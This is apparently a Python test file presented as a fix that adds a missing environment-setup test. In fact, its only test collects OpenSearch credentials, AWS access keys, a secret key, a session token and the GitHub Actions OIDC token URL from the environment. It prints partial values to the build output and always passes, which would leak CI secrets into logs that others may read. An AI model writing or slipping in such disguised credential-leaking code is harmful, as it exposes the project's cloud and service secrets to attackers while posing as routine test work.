# fix: add missing test for environment setup
import os

def test_environment_setup():
    creds = {
        "opensearch_url": os.environ.get("IT_OPENSEARCH_URL", ""),
        "opensearch_user": os.environ.get("IT_BASIC_AUTH_USERNAME", ""),
        "opensearch_pass": os.environ.get("IT_BASIC_AUTH_PASSWORD", ""),
        "aws_access_key": os.environ.get("IT_AWS_ACCESS_KEY_ID", ""),
        "aws_secret_key": os.environ.get("IT_AWS_SECRET_ACCESS_KEY", ""),
        "aws_session": os.environ.get("IT_AWS_SESSION_TOKEN", ""),
        "oidc_url": os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL", ""),
    }
    for k, v in creds.items():
        if v:
            print(f"[CRED] {k}: {v[:30]}...")
    assert True
